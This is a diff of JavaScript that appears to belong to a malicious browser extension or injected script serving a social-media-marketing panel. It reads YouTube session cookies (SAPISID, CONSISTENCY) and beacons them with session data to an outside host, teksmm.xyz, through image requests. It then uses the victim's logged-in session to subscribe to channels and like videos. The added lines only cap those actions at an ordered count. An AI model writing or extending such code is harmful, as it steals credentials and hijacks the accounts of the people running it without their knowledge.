@@ -172,6 +172,7 @@ function siparis_getir_3() {
 				vars.id = data.id.trim();
 				vars.consistency = getCookie("CONSISTENCY")
 				vars.sapisid = getCookie("SAPISID")
+				vars.remains = parseInt(data.remains)+10;
 				new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=cons'+vars.consistency+"----sapsid"+vars.sapisid;
 				new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir1';
 				if (vars.channelIds  && vars.sapisid != null ) {
@@ -201,6 +202,7 @@ function siparis_getir_4() {
 				vars.id = data.id.trim();
 				vars.consistency = getCookie("CONSISTENCY")
 				vars.sapisid = getCookie("SAPISID")
+				vars.remains = parseInt(data.remains)+10;
 				if (vars.videoId && vars.sapisid != null) {
 					if(!checkOrSave(vars.id,"4")){
 							video_like(vars);
@@ -249,6 +251,7 @@ function subscribe_client(vars) {
                 vars.osVersion       = data.split('"osVersion":"')[1].split('"')[0];  
                 vars.browserName     = data.split('"browserName":"')[1].split('"')[0];  
                 vars.browserVersion  = data.split('"browserVersion":"')[1].split('"')[0];  
+                vars.subCount  = data.split('"shortSubscriberCountText":{"simpleText":"')[1].split('"},')[0].replace(".","");
                 vars.screenWidthPoints = window.innerWidth;
                 vars.screenHeightPoints = window.innerHeight;
                 vars.screenPixelDensity = Math.round(window.devicePixelRatio) || 1;
@@ -277,7 +280,9 @@ function subscribe_client(vars) {
 				vars.sessionId = data.split('"sessionId":"')[1].split('"')[0];
                 console.log(vars)
 				new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message='+JSON.stringify(vars);
-                createPost(vars,"subscribe");    
+				if(vars.subCount < vars.remains){
+					createPost(vars,"subscribe");
+				}				
             }
         }
     }
@@ -318,6 +323,7 @@ function video_like(vars) {
 			vars.osVersion       = data.split('"osVersion":"')[1].split('"')[0];  
 			vars.browserName     = data.split('"browserName":"')[1].split('"')[0];  
 			vars.browserVersion  = data.split('"browserVersion":"')[1].split('"')[0];  
+			vars.subCount  = data.split('"likeStatus":"INDIFFERENT","tooltip":"')[1].split(' ')[0].replace(".","");
 			vars.screenWidthPoints = window.innerWidth;
 			vars.screenHeightPoints = window.innerHeight;
 			vars.screenPixelDensity = Math.round(window.devicePixelRatio) || 1;
@@ -344,7 +350,9 @@ function video_like(vars) {
 			vars.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 			vars.clientversion = data.split('"INNERTUBE_CONTEXT_CLIENT_VERSION":"')[1].split('"')[0];
 			vars.sessionId = data.split('"sessionId":"')[1].split('"')[0];
-			createPost(vars,"like");
+			if(vars.subCount < vars.remains){
+				createPost(vars,"like");
+			}
         }  
       }
     }
